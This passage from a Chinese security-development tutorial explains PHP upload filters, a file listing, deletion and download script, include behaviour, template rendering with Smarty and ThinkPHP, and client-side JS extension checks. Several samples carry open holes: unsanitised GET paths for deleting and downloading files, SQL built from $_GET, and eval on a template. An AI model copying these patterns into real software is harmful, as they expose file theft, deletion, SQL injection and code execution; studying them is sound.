class="variable">$black_ext</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>.<span class="variable">$exts</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="白名单过滤代码"><a href="#白名单过滤代码" class="headerlink" title="白名单过滤代码"></a>白名单过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_ext</span>=<span class="keyword">array</span>(<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>,<span class="variable">$allow_ext</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span>.<span class="variable">$exts</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件类型MIME机制过滤代码"><a href="#文件类型MIME机制过滤代码" class="headerlink" title="文件类型MIME机制过滤代码"></a>文件类型MIME机制过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 和上面的代码差不多，把allow改一改</span></span><br><span class="line"><span class="variable">$allow_ext</span>=<span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>,<span class="variable">$allow_ext</span>))</span><br></pre></td></tr></table></figure><h4 id="OSS存储"><a href="#OSS存储" class="headerlink" title="OSS存储"></a>OSS存储</h4><p>借助云产品OSS存储对象来存储文件</p><p>代码编写没什么区别，只需要加上accessid和accesskey和oss的地址即可，但是这个方法有泄漏的风险</p><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><p>is_dir() 函数用于检查指定的路径是否是一个目录<br>opendir() 函数用于打开指定的目录<br>readdir() 函数用于从打开的目录中读取目录中的文件和子目录<br>open_basedir：PHP.INI中的设置用来限制脚本程序访问的目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ??: <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filelist</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">        <span class="comment">//循环读取文件列表 while readdir</span></span><br><span class="line">        <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>) )!== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="comment">//判断是文件还是文件夹 is_dir</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=<span class="subst">$file</span>&#x27;&gt;&quot;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filelist</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">del</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">down</span>(<span class="params"><span class="variable">$filepath</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line">    <span class="comment">// 修改http头实现文件读取解析下载</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="variable">$fileName</span> . <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$filepath</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">down</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;down&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>include() 在错误发生后脚本继续执行<br>require() 在错误发生后脚本停止执行<br>include_once() 如果已经包含，则不再执行，与include()相同<br>require_once() 如果已经包含，则不再执行，与include()相同</p><p>假如写一个1.txt，但是里面写的是php代码，当你包含这个1.txt时，还是会执行里面的PHP代码，从而造成危害</p><h1 id="PHP框架类"><a href="#PHP框架类" class="headerlink" title="PHP框架类"></a>PHP框架类</h1><h2 id="模版引用"><a href="#模版引用" class="headerlink" title="模版引用"></a>模版引用</h2><p>写一个美观的new.html，然后里面的值用 {} 来代替，php文件中先引用new.html，然后再去替换模版中的值</p><p>在渲染模版时，会解析代码，无论是数据库中还是页面中的都会被解析，因此像代码执行、xss这些都会因此而产生</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;new.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?<span class="string">&#x27; &#x27;</span>:<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from news where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="variable">$page_title</span>=<span class="variable">$row</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">    <span class="variable">$heading</span>=<span class="variable">$row</span>[<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line">    <span class="variable">$subheading</span>=<span class="variable">$row</span>[<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span>=<span class="variable">$row</span>[<span class="string">&#x27;4&#x27;</span>];</span><br><span class="line">    <span class="variable">$item</span>=<span class="variable">$row</span>[<span class="string">&#x27;5&#x27;</span>];</span><br><span class="line">    <span class="comment">//echo $page_title;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$page_title</span>&lt;br&gt;<span class="subst">$page_title</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;page_title&#125;&#x27;</span>,<span class="variable">$page_title</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;heading&#125;&#x27;</span>,<span class="variable">$subheading</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;subheading&#125;&#x27;</span>,<span class="variable">$subheading</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;content&#125;&#x27;</span>,<span class="variable">$content</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;$item&#125;&#x27;</span>,<span class="variable">$item</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="variable">$template</span>);  <span class="comment">// ?&gt; 是为了闭合前面的php代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>是一个基于PHP开发的模版引擎，具体使用网上随便一搜都有</p><p>下载：<a href="https://github.com/smarty-php/smarty/releases">https://github.com/smarty-php/smarty/releases</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>1、创建一个文件夹，命名为smarty-demo</p><p>2、下载Smarty对应版本并解压缩到该文件夹中</p><p>3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入 Smarty 类文件</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;smarty-demo/libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Smarty 实例</span></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>;</span><br><span class="line"><span class="comment">// 设置 Smarty 相关属性</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;template_dir = <span class="string">&#x27;smarty-demo/templates/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;compile_dir = <span class="string">&#x27;smarty-demo/templates_c/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;cache_dir = <span class="string">&#x27;smarty-demo/cache/&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;config_dir = <span class="string">&#x27;smarty-demo/configs/&#x27;</span>;</span><br><span class="line"><span class="comment">// 赋值变量到模板中</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);</span><br><span class="line"><span class="comment">// 显示模板</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index.tpl&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4、创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个使用 Smarty 的例子。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这时，你在这个index.tpl中添加php代码，不启任何作用，但是模版也会有很多漏洞</p><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><h3 id="路由访问控制"><a href="#路由访问控制" class="headerlink" title="路由访问控制"></a>路由访问控制</h3><p>tp框架涉及到一个路由问题：没有启用路由的情况下典型的URL访问规则是：<a href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC%E2%80%A6]%EF%BC%8C%E6%A8%A1%E5%9D%97%E5%B0%B1%E6%98%AFtp%E4%B8%8B%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B0%B1%E6%98%AF%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84class%E5%90%8D%EF%BC%8C%E6%93%8D%E4%BD%9C%E5%B0%B1%E6%98%AF%E5%87%BD%E6%95%B0%E6%96%B9%E6%B3%95">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值…]，模块就是tp下的目录，控制器就是目录里的文件的class名，操作就是函数方法</a></p><p><img src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/image-20240128200429517.png" alt="image-20240128200429517"></p><p>比如上图代码中，在application目录下新建一个test目录，test目录下新建controller目录，controller目录下新建test.php文件，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">test</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时访问此文件为：xxxxx&#x2F;index.php&#x2F;test&#x2F;test&#x2F;aaa&#x2F;x&#x2F;123，即可返回123</p><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><p>首先在application目录下database.php文件中将数据库的连接信息写好，然后我们比如在刚刚的test.php文件中写一个查询数据的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testsql</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//使用tp框架操作mysql数据，如果按照推荐的写法，默认是受到框架内置过滤保护的</span></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">  <span class="variable">$data</span>=<span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;news&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>,<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">find</span>();  <span class="comment">//SELECT * FROM `think_user` WHERE  `id` = 1 LIMIT 1</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">  <span class="variable">$info</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">validate</span>([<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="string">&#x27;jpg,png,gif&#x27;</span>])-&gt;<span class="title function_ invoke__">move</span>( <span class="string">&#x27;../uploads&#x27;</span>); <span class="comment">// 移动到框架应用根目录/uploads/ 目录下，仅允许jpg,png,gif格式</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$info</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getExtension</span>();</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getSaveName</span>();</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getFilename</span>();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="前端页面渲染"><a href="#前端页面渲染" class="headerlink" title="前端页面渲染"></a>前端页面渲染</h3><p>系统会按照默认规则自动定位模版文件，规则为：</p><p>当前模版&#x2F;view&#x2F;当前控制器（小写）&#x2F;当前操作（小写）.html</p><p>就比如在application&#x2F;index里面创建view&#x2F;index&#x2F;index.html，这个页面写点前端，然后在application&#x2F;index&#x2F;controller&#x2F;index.php中加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure><p>即可实现，fetch()里面不写默认是index</p><p>当前，前端页面也可以写变量，类似于Smarty的写法，这是index.php中通过如下方式来替换index.html中的 {$name} 和 {$email}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>([<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;TP&#x27;</span>,<span class="string">&#x27;email&#x27;</span>=&gt;<span class="string">&#x27;aaa@qq.com&#x27;</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure><h1 id="JS原生类"><a href="#JS原生类" class="headerlink" title="JS原生类"></a>JS原生类</h1><h2 id="原生开发"><a href="#原生开发" class="headerlink" title="原生开发"></a>原生开发</h2><p>比如我们这里写一个文件上传的代码，js代码必须写在 script 两个之间</p><p>当需要调用js文件进行一个文件上传的后缀过滤时，在前端需要使用onchange事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>  // 当用户改变input输入框内容时执行一段javascript代码</span><br></pre></td></tr></table></figure><p>所以一般在上传按钮那边可以这么写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;f&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;CheckFile(this.value)&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>此时，我们的js过滤代码可以这么写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">CheckFileExt</span>(<span class="params">filename</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> flag=<span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> exts=[<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>];  <span class="comment">//规定白名单上传后缀</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index=filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);  <span class="comment">//返回.最后一次出现的位置，从前往后，从0开始数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;exts.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span>(ext==exts[i])&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> flag=<span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀正确！&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(!flag)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀错误！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="库开发"><a href="#库开发" class="headerlink" title="库开发"></a>库开发</h2><p>引用jQuery库，写一个js的登录验证，jQuery的使用可以查看相关教程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 